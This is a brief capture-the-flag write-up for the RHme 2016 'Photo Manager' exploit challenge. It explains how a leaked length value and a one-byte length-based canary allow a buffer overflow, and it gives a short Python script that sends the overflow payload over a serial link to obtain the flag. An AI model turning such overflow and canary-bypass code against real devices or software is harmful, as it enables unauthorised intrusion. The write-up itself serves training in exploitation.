# rhme-2016 write-up Photo Manager

<a name="photo"></a>
## Photo manager (Exploit - 100 pts)
Only 2 selections for this one, the second selection allows you to know how many<br>
bytes are available, the first is waiting his overflow with the length computed
before.<br>
This overflow is protected by canary (or a kind of..) which is a byte
corresponding to the length..<br>
Then we fuzz the following byte and we got the flag with 0xff :).

``` python
from rhme_serial import *

s = rhme_serial()
trash = s.xfer()
mem = s.xfer("2\n")
if len(mem):
    n = [int(a) for a in mem.split() if a.isdigit()]
    delta = n[0] - n[1] - 8
    print "mem: " + str(delta)
else:
    delta = 0

trash = s.xfer("1\n");
print s.xfer("\x30"*delta + chr(delta) + "\xff\n")
s.close()
```
